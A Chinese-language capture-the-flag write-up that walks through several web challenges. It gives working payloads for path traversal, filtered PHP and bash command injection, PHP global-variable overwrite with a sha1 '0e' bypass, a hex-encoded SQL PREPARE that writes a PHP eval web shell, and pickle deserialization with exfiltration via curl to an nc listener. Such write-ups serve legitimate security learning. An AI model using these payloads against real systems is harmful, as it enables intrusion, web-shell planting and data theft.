Web

easy_ssrf

簡單的目錄穿越，構造 ?url=/unctf.com/../flag 即可得到 flag。

babyeval

根據提示，可以知道 flag 在 flag.php 中。題目過濾了括號，根據 PHP 的特性整點反引號，再用 od 來輸出以繞過字元的檢測，構造 ?a=echo `od -A d -c f???.???`; 可以得到 flag。

UN’s_online_tools

bash 指令的堆疊，過濾了一些字元，使用 %0a 作為指令分割，%09 作為指令中的分隔，構造 ?url=1.1.1.1%0aod%09-A%09d%09-c%09/f???%0a 即可得到 flag。

easyflask

得到 __pycache__ app.py flag.txt templates error!! 的回顯，可知 flag 在當前目錄下，繼續構造 cat flag.txt 得到 flag。

easyphp

檢視 response header 中的 X-Powered-By: PHP/7.4.5， 查閱手冊可知程式碼中部分函式已經被停用，進而簡化程式碼如下。

審計可知所有請求變數會被設定至全域性，同時所有單引號和雙引號均會被加上反斜槓以轉義。設定環境變數的地方進行了簡單的 md5 和 sha1 驗證，同時對引數長度和名稱做出限定。

adminPassword 可以直接利用變數的全域性設定輕鬆覆蓋，因此得到password=LemonPrefect&adminPassword=7f41a8661986fdd34d63d4cdde2249c5。查閱資料可知，0e01000111101111110010010010000001001001 的 sha1 仍然為 0e 開頭，進而達成 0 == 0 的比較。利用一個全域性變數加一個將被拼接執行的變數 var1 即可達成檢視 phpinfo。同時，var1 需要配合語句的閉合。因此，構造 var1=\";$b();?>，b=phpinfo。

整理上述引數，得到 payload。

將上述引數構造請求傳送即可得到 phpinfo，在其中可以找到 flag。

checkin-sql

看起來很像人畜無害的隨便注，然而隨便注的三種套路都不行。關鍵在於 PREPARE 與十六進位制的配合。 PREPARE 可以構造出 prepare d from 0x73656c6563742f2a2a2f223c3f70687020406576616c28245f504f53545b615d293b203f3e2220696e746f206f757466696c6520272f7661722f7777772f68746d6c2f612e70687027;execute d; 這樣的語句來寫入一個檔案，從而直接 getshell。

getshell 之後直接構造 system("cat /flag"); 可得 flag。

easy_flask2

pickle 反序列化 參考

https://xz.aliyun.com/t/7436

從 /source 路由讀取原始碼，可以發現 flag 存放在環境變數中。同時發現可控的 pickle 反序列化點，簡單過濾了 R。

從參考處獲取不含 R 的 payload，因為沒有回顯，所以構造一個 curl 請求來從服務端使用 nc 監聽來獲取檔案內容。

按照題目的方式，在登陸後定向到 /login 路由後，將 payload base64 編碼後設置到 pkl cookie。重新整理頁面，即可在監聽處獲取到環境變數的內容，其中包含 flag。
